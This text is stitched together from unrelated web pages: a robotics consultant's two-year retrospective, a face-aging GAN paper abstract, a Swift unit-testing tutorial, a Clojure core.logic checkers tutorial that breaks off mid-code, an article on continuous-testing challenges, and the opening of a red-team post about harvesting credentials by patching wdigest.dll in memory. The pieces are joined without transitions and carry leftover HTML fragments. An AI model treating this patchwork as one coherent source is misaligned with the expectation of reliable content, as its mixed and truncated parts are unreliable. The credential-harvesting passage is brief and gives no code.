<p>I’m very grateful for the kind of work that I do - it feels amazing doing what I love and getting paid for it. I would never change my work for anything else. Every single one of my clients has an interesting problem to solve, and I’m yet to get my first negative experience working with someone. Looking back on all my clients, I’ve worked with many interesting people all around the world, mostly helping them to develop software for mobile robots and drones.</p>

    <figcaption>A world map of the 22 clients I've worked with over the past 2 years</figcaption>
</figure>

<figure>
    <img src="https://msadowski.github.io/images/2_yr_consulting/clients_europe.png" alt="Image showing 8 of my clients in Europe">
    <figcaption>My European clients</figcaption>
</figure>

<p>The duration of the projects I take on are between half a day and 2.5 years long. Everything depends on the client and what they require. Most of my projects kick off with a consultation - helping the client to solve a particular problem by sharing my expertise and experience. After this initial phase, some of the clients decide to hire me as a contractor, helping their technical team solve the challenges they face, while others are happy to carry on working by themselves with the advice received.</p>

<p>As a tangent to the consultations, I also help evaluate robotics funding proposals, as a reviewer in EU technological funding projects <a href="http://www.esmera-project.eu/welcome/">ESMERA</a> and <a href="https://trinityrobotics.eu/">TRINITY</a>, making sure your tax euros are spent on truly cutting-edge projects.</p>

<h3 id="putting-myself-in-my-clients-shoes">Putting myself in my clients’ shoes</h3>

<p>Every project I take on, I treat as my own. This results in me trying to solve issues before they happen, and sometimes even pushing back on client’s decisions - “How about we don’t remove this safety feature?”. Another side effect of treating the project as my own is that I put the client first, before my own business interest, meaning I might earn less for the project overall.</p>

<p>As an example, I was hired to test the idea a client had for a robotic project. The idea turned out to be borderline feasible, with currently available technology, but potentially requiring lots of R&amp;D work. If I sold the project as “no problem, it’s totally doable”, I would definitely get more work supporting the R&amp;D work required. By putting the project and client’s interests first, however, we finished the project after the feasibility study, having realised the extent of R&amp;D work needed.</p>

<p>Since terminating such a project before going to an R&amp;D phase is something I would do, I’m content and the client is most likely even more so, since they don’t have to spend lots of money, not understanding the R&amp;D effort required. Instead, they can decide whether to pursue the idea further. If the client does decide to take a risk, they know that I’ll be there, ready to treat their project as my own, and providing honest advice, even if it means I get less work from it.</p>

<h3 id="the-hardware">The hardware</h3>

<p>Working with hardware is one of the most enjoyable parts of my job. This year, I’ve been focusing a lot on RTK solutions (I have one blog post in the works on a neat RTK setup). Also this year, I finally got my hands on a multi-plane LiDAR, something I’ve been very keen on ever since Velodyne revealed their first multi-plane units.</p>

<h2 id="the-work-i-did-not-win">The Work I Did Not Win</h2>

<h3 id="the-dream-project">The dream project</h3>

<p>At one point, I was approached by a client who wanted to create a certain type of robot that I’ve always dreamt of working with. The task would require me to liaise with manufacturers and developers to get the robot ready, and enable support for autonomous navigation in various terrain types. In short, a hugely challenging project that would immensely help me grow, whilst being super fun at the same time. When discussing the project in more detail, I noticed that the budget for this client was not an issue - any platform for any price was OK, as long as it met the requirements. However, when asking follow up questions, it became clear that the project target was to equip robots with weapons.</p>

</figcaption>
</figure>

<p>When I was applying to University, I promised myself I would not work on weapons, even if these projects have a virtually unlimited budget. I figured that even if I was to fold my consultancy, I would rather do that than compromise on my values.</p>

<h3 id="the-bargain">The bargain</h3>

<p>In the two years working as a Robotics Consultant, I’ve noticed a pattern: the more a potential client bargains before starting the job, the more bargaining and complaining will follow, resulting in an unpleasant experience for everyone involved. In the same bucket as bargaining clients are the UpWork projects that want you to create a SLAM library from scratch for a fixed price of $50. These days, I tend to reject these types of clients and contracts straight away, saving everyone’s time.</p>

<h3 id="watch-out-for-the-legal-stuff">Watch out for the legal stuff</h3>

<p>If I’m receiving 25 pages of legal documents to review before engaging with a customer, it’s a  potential red flag. I don’t mind reading legal documents, but I would rather not involve a lawyer before even starting a project. For me, a huge red flag is when a potential client adds a very vaguely described 3-year non-compete clause, covering a whole industry. I find such terms too restrictive and would never take a project on like this, unless the project also paid for a 3 year holiday after wrapping everything up!</p>

<h3 id="the-lack-of-expertise">The lack of expertise</h3>

<p>As much as I would love to know everything about Robotics, it’s not likely to happen anytime soon. I will never take on projects that fall outside of my expertise (for example, algorithms for soft robotics), unless the client is persistent and understands an R&amp;D process. My go-to advice in such cases is that it’s not feasible to pay my high rates for me to catch up on the topic. In a hypothetical situation, if the project falls outside of my expertise, but it’s in an area I’m planning to pursue, I’d offer a very low rate for the project, highlighting that I will need to do some catching up.</p>

<h2 id="remote-robotics">Remote Robotics</h2>

<p>People often ask me how I work on robotics projects remotely (I’ve been doing this since day 1 of my consultancy). When I’m doing some high level work, it’s usually not an issue. It only becomes slightly more problematic with hardware-oriented projects. The options I’ve tested so far are:</p>

<ul>
  <li>For ROS systems, working with bag files, and in the case of drones, working with log files</li>
  <li>Clients shipping the hardware to me</li>
  <li>Travelling to the client’s location</li>
  <li>Remote control</li>
</ul>

<figure>
    <img src="https://msadowski.github.io/images/2_yr_consulting/office.jpg" alt="My office in the times of pandemic">
    <figcaption>Me and my partner's office in the time of the COVID-19 pandemic</figcaption>
</figure>

<p>ROS is absolutely the best thing that happened to people like me - I can easily review things online and even develop software with just <a href="http://wiki.ros.org/rosbag">bagfiles</a>. However, it’s not always feasible to work with bags, especially if you need to do some work related to sensors and actuators. In these cases, clients will often ship their hardware to me, so that I can integrate it locally. A very convenient way to work with clients in this way is to use a temporary import - it saves you the risk of paying taxes and duties for the expensive robotics parts, and as far as I know when doing a temporary import, you can keep the items for up to a year.</p>

<p>Travelling to the client’s location usually results in a couple of days of a hackathon solving issue. I love these, as it allows me to put the faces to Slack usernames, and I like the dynamics of these kinds of projects. On the flip side, the last time I did it, I ended up doing about 60 hours of work in 5 days - not very feasible, especially as you need to rest for a couple of days afterwards, but I would do it again!</p>

<p>Remote control of the client’s desktop is something that I try to avoid as much as possible when working with hardware. I find that not having physical access to the components is often very limiting (“can you please unplug the cable for me?”) and I estimate that in the worst cases, you are 20-40% less productive by working on robotics in this way.</p>

<h2 id="other-thoughts-on-consultancy-and-self-employment">Other Thoughts on Consultancy and Self-Employment</h2>

<h3 id="freedom">Freedom</h3>

<p>Freedom is one of the most important aspects of what I do. If I don’t work with hardware for a project, then I can usually work from whatever place I want. If I have a day when I don’t feel like working, or can’t work, then taking a day off is not an issue. To an extent, I can choose whichever projects to work on (or at least to which I can say “no” to).</p>

<figure>
    <img src="https://msadowski.github.io/images/2_yr_consulting/outdoors.jpg" alt="A mountain view">
    <figcaption>Having a possibility to go out into the mountains in the middle of the week is something I appreciate a lot</figcaption>
</figure>

<p>This freedom, however, comes with a price attached to it - if I’m not working, then I’m not making money. I don’t get bank holidays and if I get sick and can’t work, then I’m not earning either. These are the main reasons why I think working for oneself is not for everybody, especially when having no projects lined up, as it can become quite stressful.</p>

<p>Being self-employed means that you are at the centre of your business. For me, this means that my physical and mental health are my number one priorities. Examples of how I exercise these are:</p>
<ul>
  <li>Three times a week, around 4pm, I do sports (normally, I go to the gym, but during the pandemic, I’ve been going for a run)</li>
  <li>Practising meditation as the first thing I do in the morning</li>
  <li>In case of health issues, I look to fix them without thinking twice about the money (being located in Europe is a huge advantage here as I know no doctor’s visit will ruin me, financially)</li>
</ul>

<h3 id="upwork">Upwork</h3>

<p>Over the past year, most of my work has come from Upwork (you can see my profile <a href="https://www.upwork.com/freelancers/~0196b3ccb97605e632">here</a>). I won’t repeat the things I said <a href="https://msadowski.github.io/one-year-of-robotics-consulting/#upwork">last year</a> - I’ve grown to appreciate the service. I realised that the 20% fee for …</p></div></div>

<h2 id="abstract">Abstract</h2>
<p>Existing approaches and datasets for face aging produce results skewed towards the mean, with individual variations and expression wrinkles often invisible or overlooked in favor of global patterns such as the fattening of the face. Moreover, they offer little to no control over the way the faces are aged and can difficultly be scaled to large images, thus preventing their usage in many real-world applications. To address these limitations, we present an approach to change the appearance of a high-resolution image using ethnicity-specific aging information and weak spatial supervision to guide the aging process. We demonstrate the advantage of our proposed method in terms of quality, control, and how it can be used on high-definition images while limiting the computational overhead.</p>

<h2 id="model">Model</h2>
<p>Our model takes a patch <em>p</em> from the input image <em>I</em>, a target aging map <em>A</em>, and two orthonogal gradient images <em>X</em> and <em>Y</em>. The image patch <em>I<sub>p</sub></em> is then transformed according to the local aging information contained in the map <em>A<sub>p</sub></em>, while the orthogonal gradients <em>X<sub>p</sub></em> and <em>Y<sub>p</sub></em> provide the coordinates of the patch in a fully-convolutional manner. The conditions are injected in the generator via the SPADE block to preserve the spatial information. Finally, the generator uses an attention mechanism to only change relevant parts of the image, thus preserving the clothes, earrings and other facial features unrelated to aging.</p>

  <img width="70%" src="https://despoisj.github.io/AgingMapGAN/img/model_hd.jpg">
</p>

<h2 id="training">Training</h2>
<p>To train our model, we use four different losses: <em>L<sub>Age</sub></em> to penalize the aging map estimation, <em>L<sub>Loc</sub></em> for the patch localization, <em>L<sub>WGAN</sub></em> for the realism of the generated images, and <em>L<sub>Cyc</sub></em> for the fidelity to the original image.</p>

<p>We have labeled 7000 images, using 15 clinical aging signs for each image, in order to build accurate ethnicity-specific aging maps for each individual. On this dataset, our model is able to generate aged and rejuvenated faces with complete control over the localization and amount of aging.</p>

It also enables the client to provide their ideas as low fidelity designs feel less intimidating.</li><li><strong>Rapid prototyping:</strong> One of the most significant advantages of low fidelity design is that anyone in almost no time can create it, and it is also easily discardable.

The best part of going through a proper low fidelity design process is that it reduces the probability of error that can take place in the development cycle.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1598260527724/vTQ2VswEq.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>In software engineering space, we often face a situation where we developers, demand for full app revamp for numerous reasons. The codebase becomes fragile. More regression bugs popping up after every release. It takes a long time to add new features and even to resolve small bugs. Everyone is afraid of making changes to the giant beast classes. While revamping looks like a viable option in the developer's eyes, the businesses cannot hold on to building new features. Sometimes, it is impossible to afford regressions in the existing features since the customers are already used to the product.</p>
<p>Now, Is it possible to revamp once in every two or three years? The very obvious answer is a big NO! Now, what exactly went wrong? It could be the Bad software design,</p>
<ul>
<li>Giant beast classes</li>
<li>Modules are tightly coupled</li>
<li>No unit tests</li>
</ul>
<h3 id="no-unit-tests">No unit tests</h3>
<p>In this article, we are going to see only the consequences of not having unit tests and how we can prepare ourselves to write our first unit test. If you see, we might not face any of these problems while starting a new project from scratch. Everyone loves to work on a new project. As your application grows, your confidence level starts to dip down and you might not able to ship features as fast as you were. The codebase is becoming legacy very quickly without tests.</p>
<blockquote>
<p>"Legacy code is the code without tests" - Micheal Feathers in 'Working Effectively with Legacy code'.</p>
</blockquote>
<h4 id="excuse-me">Excuse me ☝️</h4>
<p>We find many excuses for not writing unit tests,</p>
<ul>
<li>Writing tests slows down the development process</li>
<li>Don't have enough time</li>
<li>Anyway, we need to do E2E testing (End to End)</li>
<li>Not sure what to test</li>
<li>Don't know how to write unit tests</li>
</ul>
<p>Well, these are misconceptions we have in our minds because we really don't understand what unit testing is for. If you're also the one finding these excuses, then it is time to understand what is unit testing and automation testing pyramid.</p>
<h4 id="what-is-unit-testing">What is unit testing?</h4>
<p>Unit Testing is a level of software testing where individual units/ components of software are tested. The purpose is to validate that each unit of the software performs as designed. A unit is the smallest testable part of any software. </p>
<h4 id="automation-testing-pyramid">Automation Testing Pyramid:</h4>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598184303373/MtdF5St73.png?auto=format&amp;q=60" alt="testpyramid.png">
If you notice, writing unit tests are cheaper and faster than E2E testing. Though, unit testing cannot replace E2E testing, unit testing holds the major importance in the pyramid space. Unit testing is the base of the test pyramid. As we know clearly that a weak base can topple down the entire building and software development is no exception. And that's when we are demanding to revamp. 
I cannot resist mentioning this funny dialogue(Tamil) by Vadivelu - that explains the weak basement quite well 🥴😂
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598188481226/hVrZpDYbR.png?auto=format&amp;q=60" alt="basement_weak-uh.png">
If you're still wondering that unit tests are not that prominent in SDLC, you must know the benefits of writing them.</p>
<h4 id="why-unit-tests">Why unit tests?</h4>
<p>Writing unit tests allows us,</p>
<ul>
<li>To Speed up the development process in the long run and deliver new features with better confidence (I know this is opposite to what I wrote in the excuses list)</li>
<li>To Refactor with confidence </li>
<li>To get Instant feedback, much faster than running the entire application and test visually every time</li>
<li>To keep the codebase maintainable. Remember that we may not be able to write effective unit tests on a codebase that is designed badly</li>
<li>To keep the various modules and components loosely coupled</li>
<li>Unit tests tell you how it behaves. Yes, it is a kind of passive documentation for your code</li>
<li>To debug the issues easily</li>
<li>Identify breaking changes in development stage itself</li>
</ul>
<h4 id="not-sure-what-to-test">Not sure what to test?</h4>
<p>Ideally, everything! But we aren't in the ideal world. While it is a good idea to aim for 100% code coverage, we might have some classes in our application that talk to External frameworks. Our objective for writing unit testing is not to test the external frameworks and that is the reason we should keep these classes as thin as possible. If your codebase doesn't have any tests and you're beginning to write, then I would recommend you start with the core feature of your application. Most often, it is not that easy to write effective tests on your core features. The chances are that they are the giant beast classes. In this case, You might want to do refactoring before writing tests. Remember, </p>
<blockquote>
<p>The more complex the class, the more you want to write tests. </p>
</blockquote>
<h4 id="how-to-write-unit-tests">How to write unit tests?</h4>
<p>AAA (Arrange, Act, Assert) is a popular pattern that suggests to divide the test method into 3 sections,</p>
<p>There are three steps we need to follow for every unit test,</p>
<ol>
<li><strong>Arrange:</strong> This section initializes objects and sets the value of the data that is passed to the method under test. This involves topics such as Test Doubles, Dependency Injection, etc</li>
<li><strong>Act:</strong> This section invokes the method under test with the arranged parameters</li>
<li><strong>Assert:</strong> This section verifies that the action of the method under test behaves as expected</li>
</ol>
<p>Consider we are testing the class <code>Stack</code>, You must have come across the term <strong><em>SUT</em></strong> which stands for 'System Under Test'. Well, in our case <code>Stack</code> is our SUT.</p>
<pre><code><span>final</span> <span><span>class</span> <span>StackTests</span>: <span>XCTestCase</span> </span>{

    <span>var</span> sut: <span>Stack</span>&lt;<span>String</span>&gt; = <span>Stack</span>()

    <span><span>func</span> <span>test_push</span><span>()</span></span> {
        
        sut = <span>Stack</span>()
        sut.push(<span>"Hello"</span>)

        
        sut.push(<span>"Reader"</span>)

        
        <span>XCTAssertTrue</span>(sut.top.data == <span>"Reader"</span>)
    }

    <span><span>func</span> <span>test_pop</span><span>()</span></span> {
        
        sut = <span>Stack</span>()
        sut.push(<span>"Hello"</span>)
        sut.push(<span>"Reader"</span>)

        
        sut.pop()

        
        <span>XCTAssertTrue</span>(sut.top.data == <span>"Hello"</span>)
    }
}
</code></pre><p>Yeah, we are now ready to kick start our unit testing journey, I mean it. Unit testing is not a destination but a continuous journey. As our application grows, we should keep writing tests. The more unit test coverage you have, the more benefit you get. Always remember that unit tests are first-class citizens in our project and they are equally important as our production source code. So it is important to plan and structure the unit test classes as well. I've chosen a simple example but when we start writing tests to our actual code, we may encounter problems in creating mocks for a complex class, testing asynchronous code, private methods, UI Components. I will cover a separate article to address the common problems in writing tests.</p>

<p>Thank you for reading this article! Let's start doing more of <code>CMD+U</code>(Test) than <code>CMD+R</code>(Run). </p>
<p>Happy coding!</p>

<![CDATA[Let's Play Checkers with AI and Clojure]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
<p>Nowadays, when you hear "AI," you are probably going to think about neural networks and model training, starting to reach for data sets and envisioning how to feed them into the learning machine. 
In this post, I will try to revive a more or less forgotten way to do things—the Logic programming way.</p>
<p>Logic programming is an exciting paradigm, according to which one expresses programs in terms of relations involving some logic variables, and expects results reflecting what do these logical variables have to be so to make sure those relations are verified(Pfeww!). </p>
<p>We are so talking about "goals" that we want to succeed: We want those relations to be actually occurring, and search for the values of our logic variables that would make that happen. </p>
<p>You can see how this sort of programming - also known as relational programming - lays the foundation of an alternative way of approaching computing. It's a declarative method in which you don't explicitly specify how to process inputs into outputs, but where you instead express queries about logical variables arranged in a set of desired relations.</p>
<p>For example, consider the following logical function :</p>
<pre><code>(multiplio x y z)
</code></pre>
<p>that stands for a goal (or a relation) succeeding if z equals x times y.
It will succeed if you query for its result while you specify a relevant value for all of the three logical variables:</p>
<pre><code>(multiplio 2 3 6) ;=&gt;Success
</code></pre>
<p>But if you specify that you want to know for which values of z it will succeed, specifying actual, fixed values for x and y, you are sort of multiplying two numbers:</p>
<pre><code>(multiplio 2 3 q) ;=&gt; Success for q = 6
</code></pre>
<p>More interestingly, you can ask what might the value of x be given that y is set to 2 and that the product z at 6</p>
<pre><code>(multiplio q 3 6) ;=&gt; Success for q = 2
</code></pre>
<p>The previous examples showed how you can write programs in terms of relations, or logic goals, and specify or ask for the values of the variables you please: No inputs, no outputs, just relations.</p>
<p>Of course, when it is unable to make your goals succeed, the relational kernel will give you "nothing." On the other hand,  if it notices that the goals are achieved every time, it returns a particular value that says, well, everything.</p>
<p>In the following, we will use relational programming to create an AI solving a round of checkers game. We will use a particular language for logic programming, <a target="_blank" href="http://minikanren.org/">miniKanren</a>, through its  Clojure implementation, <a target="_blank" href="https://github.com/clojure/core.logic">core.logic</a>. </p>

<p>In core.logic, you run your queries using a special interface, run like in the following simple example:</p>
<pre><code>(run* [q]
  (== q 1))
</code></pre>
<p>That is, you're asking core.logic to run a query over the logical variable q, so that the goal (== q 1)  is verified. == is miniKanren's unification, that is, the mecanism that makes a goal who succeeds if the terms involved are the same, which sets q to (1) in our particular example. Unification is a very important operation in logical programming, and is implemented up to the level of nested Clojure datastructures:</p>
<pre><code>(run* [q]
  (== [q 2][1 2]))
</code></pre>
<p>yields (1), as we must have q set at 1 so we have the first vector as [1 2] in order to have it unified with the second term.
But the careful reader may wonder: why do we have results laid out in sequences? This is beause the logical variable we are querying over might happen to take multiple possible values; as a matter of fact, you can choose how many solution do you want core.logic to go up to. We did mention run* (star) in our query because we want all of the solutions. If we did only want to uncover first five of them, we could have emitted a query like so:</p>
<pre><code>(run 5 [q]
  (== [q 2][1 2]))
</code></pre>

<p>Enough talk and let's play checkers. For this, we are going to implement an artificial intelligence kernel capable of analyzing some checkers' board, determining – under the game rules – where to move while staying out of the reach of its opponent's attacks, and spotting when it can capture some of the enemy's soldiers.
Let's go through a little remainder of the game of checkers. You and your opponent evolve on a square chessboard, but you can only move on diagonals over black squares one step at a time. Also, you can only move forward. Both of you can capture an enemy piece if it is situated just one step away from one of your pieces, provided that when you jump over it following the diagonal, the black square where you're landing is empty. If, while doing so, from that new position, you can capture another piece, you may go on.</p>

<p>To model the battle scene, we are going to consider three sets: one for the empty positions, one for the only piece that belongs to the checkers' solver engine, and one for the enemy's locations. To describe a particular situation, you may tell the solver what's in each of these sets. As far as the items that will be put in them are concerned, we will store in them coordinates of positions on the checker's board. For instance, to tell that the enemy has 3 pieces, we just throw the 3 vectors representing the positions where these pieces are in the enemy's set. </p>
<p>The following figure explains how we are going to represent the different positions on a chessboard of 6 squares edges. Note that for its construction, to consider only the black squares, we are going to alternate a set of vectors crossing even with odd coordinates, then odd with even ones.
<img src="https://dev-to-uploads.s3.amazonaws.com/i/vwgz7dgmp0k8slnqnl4g.png" alt="Alt Text"></p>
<p>The solver is concerned about three significant matters when trying to figure out the action it must take: </p>
<ol>
<li>Where to put the checker, </li>
<li>Will the moving piece be captured when it goes there, </li>
<li>Whether it can win one or more of its opponent's pieces if after jumping, he has the opportunity to do so. Let's implement it.</li>
</ol>
<h2 id="building-the-chessboard">Building the Chessboard</h2>
<p>For starters, we are going to declare our ns. Note that we are using the finite domain constrains engine, clojure.core.logic.fd, to be able to derive goals where algebraic operations are involved:</p>
<pre><code>(ns recipe19.core
  (:require [clojure.core.logic :as logic]
            [clojure.core.logic.fd :as fd]))
</code></pre>
<p>We now focus on constructing the chessboard. As we mentioned earlier, we will build a set of vectors, associating odd x coordinates with even y ones, then the other way around: even x coordinates with odd y ones:</p>
<pre><code>(defn evenso
  [size out]
  (logic/fresh [x2 se]
    (fd/in x2 (fd/interval 0  (/ size 2)))
    ;; We construct a set of integers
    ;; going from 0 to half the size
    ;; using a core.logic finite domain
    ;; facility
    (fd/* x2 2 se)
    ;; we construct the even coords
    (logic/== out se)))
;; and we output them by unifying them
;; with output

(defn oddso [size out]
  (logic/fresh [x2 seo so]
    (fd/in x2 (fd/interval 0  (/  size 2)))
    ;; Same logic applies for odd part
    (fd/* x2 2 seo)
    ;; We generate an even number
    (fd/+ seo 1 so)
    ;; Then we add 1 to it
    (fd/&lt;= so size)
    ;; We ensure that we do not exceed
    ;; size
    (logic/== out so)))
;; And we unify with output

(defn boardo [size out]
  (logic/fresh [e o]
    (oddso size o)
    (evenso  size e)
    ;; Then starting from even and odd numbers
    (logic/conde 
     [(logic/== out [e o])]
     ;; We combine a first set of vectors
     ;; Crossing [even odd]
     [(logic/== out [o e])])))
     ;; And crossing [odd even]
</code></pre>
<h2 id="moving-the-piece">Moving the piece</h2>
<p>Let's build the goal function that determines where our piece shall go starting from a current position. This moves our piece up, incrementing the y part of the coordinates, and go to the left and to the right by adding or deducing 1 from the x component:</p>
<pre><code>(defn where-to-movo
  [empty cur-pos out]
  (logic/fresh [-&gt;x -&gt;y curx cury]
    (logic/== [curx cury] cur-pos)
    ;; We destructure the position into
    ;; x and y parts
    (logic/conde
     [(fd/+ 1 curx -&gt;x)]
     [(fd/- curx 1 -&gt;x)])
    ;; We go left or right,
    ;; adding or substracting 1
    ;; to x and storing it into -&gt;x
    (fd/+ cury 1 -&gt;y)
    ;; We can only move up, adding 1 to y
    ;; and storing it into -&gt;y
    (logic/membero [-&gt;x -&gt;y] empty)
    ;; We verify that the target position
    ;; is empty by seeing if it is present
    ;; in the empty set
    (logic/== out [-&gt;x -&gt;y])))
    ;; And we unify with the output
</code></pre>
<h2 id="dont-get-captured">Don't Get Captured!</h2>
<p>After the solver has determined where it can move its piece, it needs a goal function that tells if, at that position, that piece won't be captured by any of the opponent's pieces. That's the aim of the following goal function:</p>
<pre><code>(defn isnt-capturedo
  [empty mypos enemy out]
  (logic/fresh [x-&gt;
                      y-&gt;
                      -&gt;x
                      -&gt;y
                      y-&gt;y
                      x-&gt;x
                      new-x
                      new-y]
    (logic/== [x-&gt; y-&gt;] enemy)
    (logic/== [-&gt;x -&gt;y] mypos)
    ;; We destructure enemy and our
    ;; position
    (logic/conde
     [(fd/- x-&gt; -&gt;x x-&gt;x)]
     [(fd/- -&gt;x x-&gt; x-&gt;x)])
    ;; As core.logic.fd can't handle
    ;; negative numbers, we must use
    ;; a conde so we can get the difference
    ;; between the coords, whether is enemy's x higher
    ;; than the solver's, or the other way around.

<h2><strong>Introduction</strong></h2>



<p>Continuous Testing is the process of testing at all stages of software development – one after the another- without any human intervention. <a href="https://testsigma.com/continuous-testing" target="_blank" rel="noopener noreferrer">Continuous Testing</a> is key to faster delivery of Agile products to the market. </p>



<p>Continuous Testing makes it possible to eliminate testing as a bottleneck for faster software development and delivery. But the path to achieving Continuous Testing has its own challenges, most common of which are mentioned below.</p>



<h2><strong>Common Challenges</strong></h2>



<p><strong>1. Lack of Testability Support in Products:</strong> A test automation system is a very basic requirement for Continuous Testing. To achieve strong automated testing for a product, you need to have almost all of your test cases automated. But does the product have the testability support required to automate all test cases? Not always! If products are not designed, keeping testability in mind, achieving continuous testing may become a distant dream.</p>



<p>Achieving continuous testing for new feature work done in legacy products becomes more difficult if the product didn’t have testability support initially. Adding testability support to such products is expensive and may not always get prioritized as compared to other items on the product roadmap, draining down the efforts for Continuous Testing.</p>



<p><strong>2. Lack of Standard Tools:</strong> For a variety of products, standard tools to achieve continuous testing don’t exist. Teams often resort to using in-house test automation tools or frameworks which are neither well-documented nor well-maintained. This adds to the woes of the testing team as they now have to struggle with the issues of the tool/framework also.</p>



<p>With in-house tools/frameworks, you have the benefit of code-ownership. You can make changes to the tool/framework to get desired behaviour, but that is a costly affair in terms of resources. You are now investing your resources to evolve the tool/framework rather than the product. Practically, teams don’t have the luxury to customize the testing tool/framework for their needs when they need to deliver a quality product on an impending timeline.</p>



<p><strong>3. Lack of Faster Feedback Loops:</strong> To leverage Continuous Testing, it is important to incorporate feedback on an on-going basis. To incorporate feedback on a continuous basis, you need feedback loops in the system that can help you gather feedback in real-time. Lack of such feedback loops introduce a delay in action, later affecting the quality of the product.</p>



<p>For example, if one of the test environments used to run automation tests is down, an alert message for the same helps you act timely to rectify it rather than digging into the cause of the non-arrival of the test report for scheduled test automation run.&nbsp;</p>



<p>Similarly, it helps to have a real-time dashboard for performance which depicts the performance metrics over a period of time rather than digging into logs and code-profiler reports every time you want to check on a product’s performance. When such dashboards are accessible to everyone on the team, it helps in bringing critical issues to the table and gets them prioritized.&nbsp;</p>



<p><strong>4. Lack of Testing Infrastructure:</strong> Often, organizations embark on the path of embracing Continuous Testing, without realizing the budgetary needs for it.</p>



<p>To implement Continuous Testing, you might need additional test environments that need to be maintained and kept up and running round the clock. You might also need advanced tools to incorporate faster feedback loops.&nbsp;</p>



<p>Although these costs aren’t significant as compared to the cost incurred due to the poor quality of the product, there is a need for organizational commitment. A half-way journey to continuous testing without adequate infrastructure only adds to the woes of the testing team and doesn’t help anyone.&nbsp;&nbsp;</p>



<p><strong>5. Lack of Enough Testers:</strong> Most product teams don’t have enough testers, which sometimes creates bottlenecks for achieving continuous testing. Continuous testing is an on-going journey and requires high initial investments in terms of setup, which may create extra workload for testers.</p>



<p>Until continuous testing reaches the stage where it can replace the need for traditional testing, testers are often caught in balancing the efforts required for switching to continuous testing and their regular testing tasks that usually have a high priority w.r.t product needs. This adds to the pending backlogs for achieving continuous testing, creating a chicken-and-egg situation, where continuous testing can reduce the testing time but there is no time to set up continuous testing.</p>



<p><strong>6. <a href="https://testsigma.com/blog/why-test-data-management-is-more-important-than-you-think/" target="_blank">Test Data Management</a>:</strong> Depending on the product and its testing needs, test data management sometimes becomes a bottleneck for continuous testing.</p>



<p>Test data when stored locally for testing environments may result in different versions of test data which may be difficult to maintain. Maintaining test data in a central repository and then accessing it from different test environments may ease this problem but may introduce other issues like network latency in tests.</p>



<p><strong>7. Increased Complexity:</strong> As the scope for the product grows, so does the scope for continuous testing.</p>



<p>With a large number of tests added to the system, it becomes a challenge to make the tests execute quickly. If tests take too long to run, it defeats the whole purpose of continuous testing as quick feedback is not available. If not all tests are run, it seems like a compromise on the quality of the product. Also, if not all tests are run, it makes the effort of adding all those tests to the system go in vain.</p>



<p><strong>8. Scalability Issues:</strong> Not all testing frameworks/tools may be suitable for scaling purposes.</p>



<p>Lack of support for large concurrent test sessions and slow test executions can become serious bottlenecks for your dream of achieving Continuous Testing.</p>



<p>Such scalability issues aren’t always noticeable in the beginning. They become clearly visible only after a significant amount of tests have been added to the system and the test system starts to get highly loaded. This makes the situation worse as at such a stage, it’s even more difficult to switch to a different tool/framework.</p>



<p><strong>9. Inefficient Processes:</strong> Sometimes, the processes followed in the team/organization are not conducive for achieving Continuous Testing. Let’s check:</p><p><strong>i. Change in Requirements:</strong> If requirement specifications keep on changing frequently, it creates a lot of rework for the team, especially the testing team as tests may need to be updated every time there is a change in the requirements. This may adversely impact the efforts for continuous testing.</p><p><strong>ii. Unclear Roles and Responsibilities of Team Members:</strong> If the roles and responsibilities of team members are not clearly defined, it may result in ambiguous ownership of tasks. Such ambiguity can lead to redundant efforts on some tasks and some tasks getting totally ignored. Clear ownership of tasks is important in achieving Continuous Testing.</p><p><strong>iii. Excluding Testing Team in Initial Discussions:</strong> If the testing team is not included in all product-related discussions from the beginning, it would create gaps in the understanding which may impact continuous testing. Also, it would require additional processes such as hand-offs from Developers to Testers from time to time, adding inefficiency to the whole system.&nbsp;</p><p><strong>iv. Bureaucratic Approvals:</strong> If your team/organization functions with heavy bureaucracy and approvals are needed for every small thing, it can add inefficiency to the whole system which can make it hard to achieve continuous testing.&nbsp;</p>



<p>For example, if a test environment has gone down and you don’t have the required access privileges to bring it back up and need to wait on some other team/person for this, it can lead to inefficiency in the continuous testing pipeline.&nbsp;</p>



<h2><strong>Suggestions for Resolving Some Common Challenges</strong></h2>



<p>Most of the common challenges discussed above can be worked around with the help of some suggestions discussed below.</p>



<p><strong>1. Include Testability from Beginning:</strong></p><p><strong>i. </strong>Testability should be part of the low-level design for the product.</p><p><strong>ii. </strong>Any feature developed for the product should not be considered complete unless it has the required testability support for Continuous Testing.</p>



<p><strong>2. Evaluate Tools/Frameworks before Including them in the System:</strong></p><p><strong>i. </strong>It’s good to evaluate any testing tool/framework for required support before getting bound to it by making it part of the system.</p><p><strong>ii. </strong>The right combination of open source and paid test frameworks/tools can be used rather than relying solely on open-source test frameworks/tools.</p><p><strong>iii. </strong>Having a defined set of parameters to capture results of experiments with new tools can help in a better evaluation of tools/frameworks in a much-organized way.</p>



<p><strong>3. Evaluate Budget Requirements before Embracing Continuous Testing:</strong> Implementing Continuous Testing may need a significant budget for test environments and tools/frameworks.</p>



<p>Evaluating budget requirements before starting on the path of Continuous Testing helps in making informed decisions early rather than being stuck in the middle of the path due to budgetary constraints.</p>



<p><strong>4. Leveraging Cloud-based Virtual Infrastructure:</strong> Cloud-based test environments can be made accessible instantaneously on demand. They also save testing teams from most of the headache associated with managing and maintaining traditional test environments. Leveraging cloud-based virtual environments can help resolve a lot of issues related to the availability of test environments for Continuous Testing.&nbsp;&nbsp;</p>



<p> Using test automation tools that support test automation workflows on the cloud can further add to these benefits. Testsigma is one such tool.</p>

<p>In ye old days, a [hacker, red teamer, penetration tester, motivated child] would compromise a host, use an exploit to elevate or laterally move, and then Mimikatz their way to glory (ok, maybe not <em>just</em> in the old days).&nbsp; This is becoming increasingly more complicated to achieve.  Many new technologies have been implemented to prevent or restrict access to credentials on a compromised host.&nbsp; Last year, Adam Chester (@_xpn_) wrote an <a href="https://blog.xpnsec.com/exploring-mimikatz-part-1/">excellent blog post</a> on memory patching wdigest.dll to enable UseLogonCredentials.  This is done without dropping files to disk or changing registry keys.&nbsp; I will touch on this briefly, but I strongly recommend reading his post before reading through this.&nbsp;</p>



